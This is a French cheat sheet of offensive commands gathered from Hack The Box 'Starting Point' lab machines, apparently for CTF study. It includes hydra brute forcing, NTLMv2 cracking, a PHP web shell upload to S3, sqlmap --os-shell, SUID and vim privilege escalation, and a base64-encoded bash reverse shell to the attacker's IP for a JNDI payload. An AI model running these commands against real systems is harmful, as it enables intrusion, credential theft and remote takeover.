# Starting point

Ceci est un résumé des commandes utiles que j’ai pu noter après avoir root toutes les machines starting-point (tous les tiers + les machines VIP).

```bash
smbclient -L \\\\IP
```

pour avoir la liste des shares (\ en double pour escape)

```bash
smbclient \\\\IP\\WorkShares
```

Scanner tous les ports:

```bash
nmap -p-
```

Interagir avec Redis:

```bash
redis-cli
```

[https://linuxhint.com/see-all-redis-keys/#:~:text=To list the keys in,to get all the keys](https://linuxhint.com/see-all-redis-keys/#:~:text=To%20list%20the%20keys%20in,to%20get%20all%20the%20keys).

remmina pour RDP sur linux

se connecter à une db mongo à distance:

```bash
./mongo mongodb://{target_IP}:27017
```

trouver l’info nommée flag dans la bdd mariaDB:

```bash
db.flag.find().pretty()
```

hydra HTTP:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form "/:username=^USER^&password=^PASS^":failmessage
```

Wappalyzer pour analyser les sites web

John pour les challenges / responses NTLM V2

Responder pour capturer les challenges

Pour john bien spécifier la wordlist comme ça:

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt
```

awscli pour interagir avec les instances amazon

Initier le setup (mettre des valeurs bidons):

```bash
aws configure
```

copier du code sur le serveur distant:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

bible SSTI: [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)

Burp gère tout même l’encodage

Pas mal de fois ou il faut tester les mdp courants en manuel

[mssqlclient.py](http://mssqlclient.py) pour les db sql microsoft

Avoir un réel shell : 

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```python
export PATH=/tmp:$PATH pour SUID
```

Exemple de SQLMap

```python
sqlmap -u 'http://10.129.160.25/dashboard.php?search=any+query' --cookie="PHPSESSID=9ffr65l45v8ao6l5jirfhobbhe" --os-shell
```

Possible de faire une privesc en faisant spawn un shell avec vi ou vim

Au lieu d’utiliser wireshark : on peut utiliser tcpdump pour intercepter:

```python
sudo tcpdump -i tun0 port 389
```

payload base64 pour jndi

```python
echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' |
base64
```

utiliser rogue jndi

```python
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|
{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```

technique pour upgrade le shell: 

```python
script /dev/null -c bash
```

Trouver des users avec MongoDB

```python
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Créer un password et le hasher:

```python
mkpasswd -m sha-512 Password1234
```

Pour faire un scan UDP (très long):

```python
sudo nmap -sU
```

```python
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc
69/udp open|filtered tftp
```

LXC peut être utilisé pour faire du privesc avec les containers

exemple de listing rsync:

```python
rsync --list-only 10.129.115.240::
```

alternative au netcat:

```python
ss -tln
```

exemple de local port forwarding pour utiliser un tool depuis parrot vers la machine cible

Permissions fichier windows :

```python
icacls
```

Pour lire les fichiers swap:

```python
vim -r
```

Lien utile pour GTFO

[https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/)